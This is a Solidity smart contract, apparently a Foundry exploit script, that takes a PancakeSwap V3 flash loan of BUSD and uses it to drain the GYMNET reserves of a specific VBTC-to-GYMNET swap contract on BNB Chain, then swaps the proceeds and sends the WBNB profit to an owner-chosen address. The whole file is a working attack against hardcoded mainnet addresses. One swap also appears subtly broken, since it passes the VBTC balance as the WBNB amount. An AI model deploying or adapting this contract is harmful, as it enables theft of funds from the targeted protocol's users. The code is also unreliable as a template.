//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

interface VBTCToGymNet {
    function getVbtcPrice(uint256 amount) external view returns (uint256);
    function getGymNetworkPrice(uint256 amount) external view returns (uint256);
    function swapTokens(uint256 _tokens) external;
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions public DCK_BUSD_POOL = IUniswapV3PoolActions(0xD465D9C13C43003f5B874e0D96A6030336Ed50eB);

    IUniswapV2Router public constant uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    VBTCToGymNet public constant vbtcToGymnet = VBTCToGymNet(0xE691e7f027830F832F77345B9bb3b603811385f1);

    ERC20 public constant WBNB = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ERC20 public constant CAKE = ERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    ERC20 public constant BUSD = ERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    ERC20 public constant VBTC = ERC20(0x268bB0f44AB880be59cCD2b96bFA138211e27a20);
    ERC20 public constant GYMNET = ERC20(0x0012365F0a1E5F30a5046c680DCB21D07b15FcF7);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(uniswapRouter), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(uniswapRouter), 0);
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata data) external {
        uint256 borrowAmount = abi.decode(data, (uint256));

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(BUSD), address(VBTC), BUSD.balanceOf(address(this)), address(this)
        );

        console.log("After buy");
        console.log("Before burn");
        console.log("Bot VBTC balance =>", VBTC.balanceOf(address(this)) / 1 ether);
        console.log();

        uint256 gymnetBalance = GYMNET.balanceOf(address(vbtcToGymnet));
        uint256 vbtcAmount =
            gymnetBalance * vbtcToGymnet.getGymNetworkPrice(1 ether) / vbtcToGymnet.getVbtcPrice(1 ether);

        VBTC.approve(address(vbtcToGymnet), vbtcAmount);

        vbtcToGymnet.swapTokens(vbtcAmount);

        console.log("After swap");
        console.log("Before sell");
        console.log("Bot VBTC balance =>", VBTC.balanceOf(address(this)) / 1 ether);
        console.log("Bot GYMNET balance =>", GYMNET.balanceOf(address(this)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(VBTC), address(BUSD), VBTC.balanceOf(address(this)), address(this)
        );

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(GYMNET), address(WBNB), GYMNET.balanceOf(address(this)), address(this)
        );

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(WBNB), address(CAKE), VBTC.balanceOf(address(this)), address(this)
        );

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(CAKE), address(BUSD), CAKE.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("Bot BUSD balance =>", BUSD.balanceOf(address(this)) / 1 ether);
        console.log();

        require(BUSD.balanceOf(address(this)) > borrowAmount + fee1, "No profit");

        BUSD.transfer(address(DCK_BUSD_POOL), borrowAmount + fee1);

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(BUSD), address(CAKE), BUSD.balanceOf(address(this)), address(this)
        );

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(CAKE), address(WBNB), CAKE.balanceOf(address(this)), address(this)
        );
    }

    function main(uint256 flashLoanAmount, address withdrawAddress) public onlyOwner {
        flashLoanAmount = flashLoanAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount);

        DCK_BUSD_POOL.flash(address(this), 0, flashLoanAmount, params);

        WBNB.transfer(withdrawAddress, WBNB.balanceOf(address(this)));

        console.log("Profit =>", (WBNB.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }
}
